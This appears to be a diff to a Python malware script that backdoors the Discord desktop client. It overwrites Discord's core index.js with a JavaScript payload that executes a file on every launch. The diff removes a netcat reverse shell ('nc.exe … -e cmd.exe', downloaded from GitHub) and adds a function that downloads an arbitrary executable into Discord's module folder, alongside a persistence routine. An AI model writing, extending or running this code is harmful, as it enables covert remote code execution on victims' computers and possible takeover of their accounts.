@@ -2,11 +2,12 @@ import os
 import requests
 import shutil
 
+url = ""
 user = str(os.environ["USERNAME"])
 basename = str(os.path.basename(__file__))
 
 payload = """const { exec } = require("child_process");
-exec("C:\\\\Users\\\\""" + user + """\\\\Documents\\\\nc.exe -vv 127.0.0.1 4444 -e cmd.exe", (error, stdout, stderr) => {
+exec("C:\\\\Users\\\\""" + user + """\\\\AppData\\\\Roaming\\\\discord\\\\0.0.309\\\\modules\\\\discord_desktop_core\\\\module.exe", (error, stdout, stderr) => {
 if (error) {
         console.log(`error: ${error.message}`);
         return;
@@ -20,10 +21,12 @@ console.log(`stdout: ${stdout}`);
 module.exports = require('./core.asar');
 """
 
+def download_module():
+    r = requests.get(url, allow_redirects=True)
+    with open("C:\\Users\\" + user + "\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_desktop_core\\module.exe", "wb") as f:
+        f.write(r.content) 
+
 def backdoor(filename):
-    r = requests.get("http://github.com/diegocr/netcat/raw/master/nc.exe", allow_redirects=True)
-    with open("C:\\Users\\" + user + "\\Documents\\nc.exe", "wb")as f3:
-        f3.write(r.content)
     with open(filename, 'r') as f2:
         content = f2.read()
         if content == payload:
@@ -39,6 +42,7 @@ def persistance():
 
 def main():
     path = "C:\\Users\\" + user + "\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_desktop_core\\index.js"
+    download_module()
     backdoor(path)
     persistance()
 
